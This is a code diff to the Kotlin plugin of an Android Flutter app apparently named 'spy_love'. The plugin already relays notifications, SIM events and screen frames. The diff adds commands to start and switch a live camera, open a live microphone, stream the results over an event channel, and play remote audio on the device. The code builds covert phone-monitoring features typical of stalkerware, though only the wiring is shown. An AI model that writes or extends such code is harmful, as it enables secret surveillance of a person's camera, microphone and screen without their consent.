@@ -1,6 +1,9 @@
 package org.hmg.spy_love
 
 import android.Manifest
+import android.media.AudioAttributes
+import android.media.AudioFormat
+import android.media.AudioTrack
 import android.app.AppOpsManager
 import android.app.usage.UsageStatsManager
 import android.content.BroadcastReceiver
@@ -25,6 +28,7 @@ import android.telephony.SubscriptionManager
 import android.telephony.TelephonyManager
 import androidx.core.content.ContextCompat
 import io.flutter.embedding.engine.FlutterEngine
+import io.flutter.plugin.common.BinaryMessenger
 import io.flutter.plugin.common.EventChannel
 import io.flutter.plugin.common.MethodChannel
 
@@ -143,6 +147,40 @@ class MonitoringPlugin(private val context: Context) : MethodChannel.MethodCallH
             }
             "stopScreenCapture" -> {
                 ScreenCaptureController.stopCapture(context)
+                result.success(null)
+            }
+            "startLiveCamera" -> {
+                val facing = call.argument<String>("facing") ?: "back"
+                LiveAvController.startCamera(context, facing, result)
+            }
+            "switchLiveCamera" -> {
+                val facing = call.argument<String>("facing") ?: "back"
+                LiveAvController.switchCamera(facing, result)
+            }
+            "stopLiveCamera" -> {
+                LiveAvController.stopCamera(context)
+                result.success(null)
+            }
+            "startLiveMic" -> {
+                LiveAvController.startMic(context, result)
+            }
+            "stopLiveMic" -> {
+                LiveAvController.stopMic(context)
+                result.success(null)
+            }
+            "playPcmChunk" -> {
+                val pcm = call.argument<ByteArray>("pcm")
+                val sampleRate = call.argument<Int>("sampleRate") ?: 16000
+                val channels = call.argument<Int>("channels") ?: 1
+                if (pcm == null) {
+                    result.success(null)
+                    return
+                }
+                PcmPlayback.play(pcm, sampleRate, channels)
+                result.success(null)
+            }
+            "stopPcmPlayback" -> {
+                PcmPlayback.stop()
                 result.success(null)
             }
             "openSettingsPage" -> {
@@ -690,14 +728,15 @@ class MonitoringPlugin(private val context: Context) : MethodChannel.MethodCallH
         private const val NOTIFICATION_EVENT_CHANNEL = "org.hmg.spy_love/notification_events"
         private const val SIM_EVENT_CHANNEL = "org.hmg.spy_love/sim_events"
         private const val SCREEN_FRAME_EVENT_CHANNEL = "org.hmg.spy_love/screen_frames"
+        private const val LIVE_AV_EVENT_CHANNEL = "org.hmg.spy_love/live_av"
 
-        fun register(flutterEngine: FlutterEngine, context: Context) {
+        fun register(messenger: BinaryMessenger, context: Context) {
             val plugin = MonitoringPlugin(context)
 
-            MethodChannel(flutterEngine.dartExecutor.binaryMessenger, METHOD_CHANNEL)
+            MethodChannel(messenger, METHOD_CHANNEL)
                 .setMethodCallHandler(plugin)
 
-            EventChannel(flutterEngine.dartExecutor.binaryMessenger, NOTIFICATION_EVENT_CHANNEL)
+            EventChannel(messenger, NOTIFICATION_EVENT_CHANNEL)
                 .setStreamHandler(object : EventChannel.StreamHandler {
                     override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
                         NotificationEventSink.sink = events
@@ -708,7 +747,7 @@ class MonitoringPlugin(private val context: Context) : MethodChannel.MethodCallH
                     }
                 })
 
-            EventChannel(flutterEngine.dartExecutor.binaryMessenger, SIM_EVENT_CHANNEL)
+            EventChannel(messenger, SIM_EVENT_CHANNEL)
                 .setStreamHandler(object : EventChannel.StreamHandler {
                     override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
                         SimEventSink.sink = events
@@ -720,7 +759,7 @@ class MonitoringPlugin(private val context: Context) : MethodChannel.MethodCallH
                     }
                 })
 
-            EventChannel(flutterEngine.dartExecutor.binaryMessenger, SCREEN_FRAME_EVENT_CHANNEL)
+            EventChannel(messenger, SCREEN_FRAME_EVENT_CHANNEL)
                 .setStreamHandler(object : EventChannel.StreamHandler {
                     override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
                         ScreenFrameEventSink.sink = events
@@ -728,6 +767,17 @@ class MonitoringPlugin(private val context: Context) : MethodChannel.MethodCallH
 
                     override fun onCancel(arguments: Any?) {
                         ScreenFrameEventSink.sink = null
+                    }
+                })
+
+            EventChannel(messenger, LIVE_AV_EVENT_CHANNEL)
+                .setStreamHandler(object : EventChannel.StreamHandler {
+                    override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
+                        LiveAvEventSink.sink = events
+                    }
+
+                    override fun onCancel(arguments: Any?) {
+                        LiveAvEventSink.sink = null
                     }
                 })
         }
